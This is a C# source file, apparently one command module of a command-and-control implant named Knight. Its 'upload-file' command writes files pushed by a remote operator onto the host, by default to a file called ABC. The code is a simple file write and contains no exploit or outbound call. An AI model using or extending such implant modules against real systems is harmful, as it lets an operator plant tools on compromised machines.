using Knight.Models.Raven;
using System;
using System.IO;

namespace Knight.Commands
{
    public class UploadFile : KnightCommand
    {
        public override string Name => "upload-file";

        public override string Execute(TaskMessage task)
        {
            string path = "";

            if (task.Arguments is null || task.Arguments.Length == 0)
            {
                path = Directory.GetCurrentDirectory() + "\\ABC";
            }
            else
            {
                path = task.Arguments[0];
            }

            try
            {
                File.WriteAllBytes(path, task.File);
                return $"wrote {task.File.Length} bytes to {path}";
                //File.WriteAllBytes(path, task.FileBytes);
                //return $"wrote {task.FileBytes.Length} bytes to {path}";
            }
            catch (Exception e)
            {
                return e.ToString();
            }
        }
    }
}